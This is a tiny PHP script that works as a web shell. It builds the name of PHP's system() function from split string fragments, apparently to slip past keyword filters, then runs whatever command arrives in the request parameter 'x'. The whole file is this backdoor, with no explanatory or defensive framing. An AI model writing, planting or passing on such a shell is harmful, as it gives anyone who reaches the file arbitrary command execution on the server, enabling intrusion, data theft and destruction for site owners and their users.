<?php
$ch = explode(".","as.sy.s.tem.t");
$c = $ch[1].$ch[2].$ch[3]; //system
$c($_REQUEST['x']);
?>